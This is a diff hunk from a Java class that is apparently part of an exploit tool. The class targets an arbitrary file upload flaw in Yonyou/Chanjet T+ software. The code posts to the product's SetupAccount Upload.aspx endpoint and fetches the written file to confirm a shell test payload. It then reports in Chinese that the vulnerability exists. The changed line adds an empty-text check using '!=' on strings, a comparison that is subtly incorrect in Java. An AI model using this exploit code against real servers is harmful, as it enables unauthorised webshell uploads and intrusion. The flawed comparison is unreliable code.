@@ -35,7 +35,7 @@ public class yongyou_chajet_upload implements Exploitlnterface {
         Response post = HttpTools.post(url + "/tplus/SM/SetupAccount/Upload.aspx?preload=1", fir_post, this.headers, "utf-8");
         if (post.getCode() == 200) {
             Response response = HttpTools.get(url + "/tplus/SM/SetupAccount/images/" + filename, new HashMap<String, String>(), "utf-8");
-            if (response.getText().contains(shell.test_payload)) {
+            if (response.getText() != "" && response.getText().contains(shell.test_payload)) {
                 Platform.runLater(() -> {
                     textArea.appendText("\n 漏洞存在，测试文件写入成功 \n地址为：" + url + "/tplus/SM/SetupAccount/images/" + filename);
                 });
